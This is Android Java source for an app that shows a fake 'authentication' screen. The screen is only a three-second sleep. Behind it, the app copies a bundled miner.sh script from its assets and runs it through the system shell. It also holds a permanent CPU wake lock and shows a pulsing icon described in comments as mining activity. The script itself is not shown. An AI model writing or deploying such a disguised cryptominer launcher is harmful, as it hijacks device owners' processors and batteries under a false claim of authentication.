package com.miner.app;

import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private TextView statusText;
    private ProgressBar progressBar;
    private View pulseView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Layout Simples e Moderno
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setPadding(50, 50, 50, 50);

        statusText = new TextView(this);
        statusText.setText("Verificando autenticação...");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        
        // Círculo de Pulsação (Simula atividade de mineração)
        pulseView = new View(this);
        LinearLayout.LayoutParams pulseParams = new LinearLayout.LayoutParams(100, 100);
        pulseParams.setMargins(0, 40, 0, 40);
        pulseView.setLayoutParams(pulseParams);
        pulseView.setBackgroundResource(android.R.drawable.presence_online); // Ícone verde
        pulseView.setVisibility(View.INVISIBLE);

        layout.addView(progressBar);
        layout.addView(statusText);
        layout.addView(pulseView);
        
        setContentView(layout);

        // Manter a CPU ativa
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Miner:Wakelock");
        wakeLock.acquire();

        new Thread(() -> {
            try {
                // Simular verificação por 3 segundos
                Thread.sleep(3000);

                File script = new File(getFilesDir(), "miner.sh");
                copyAsset("miner.sh", script);
                script.setExecutable(true);

                ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", script.getAbsolutePath());
                pb.directory(getFilesDir());
                pb.environment().put("IS_NATIVE_APP", "true");
                pb.environment().put("APP_FILES_DIR", getFilesDir().getAbsolutePath());
                pb.redirectErrorStream(true);
                pb.start();

                // Atualizar UI para Sucesso
                new Handler(Looper.getMainLooper()).post(() -> {
                    statusText.setText("Area autenticada");
                    statusText.setTextColor(Color.GREEN);
                    progressBar.setVisibility(View.GONE);
                    
                    // Iniciar Animação de Mineração (Pulsação)
                    pulseView.setVisibility(View.VISIBLE);
                    AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
                    blink.setDuration(1000);
                    blink.setRepeatMode(Animation.REVERSE);
                    blink.setRepeatCount(Animation.INFINITE);
                    pulseView.startAnimation(blink);
                });

            } catch (Exception e) {
                e.printStackTrace();
                new Handler(Looper.getMainLooper()).post(() -> {
                    statusText.setText("Erro na autenticação. Tente novamente.");
                    statusText.setTextColor(Color.RED);
                });
            }
        }).start();
    }

    private void copyAsset(String name, File dest) throws Exception {
        InputStream is = getAssets().open(name);
        OutputStream os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) {
            os.write(buffer, 0, read);
        }
        is.close();
        os.flush();
        os.close();
    }
}
